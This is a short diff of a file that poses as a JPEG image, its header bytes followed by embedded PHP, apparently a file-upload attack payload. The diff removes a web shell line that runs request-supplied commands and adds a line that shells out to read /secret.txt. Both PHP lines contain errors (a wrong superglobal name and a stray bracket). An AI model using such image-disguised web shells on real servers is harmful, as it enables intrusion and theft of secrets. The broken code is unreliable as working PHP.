@@ -1,3 +1,3 @@
 ÿØÿ<?php
-echo system($GET['cmd']);
+system('cat /secret.txt']);
 ?>
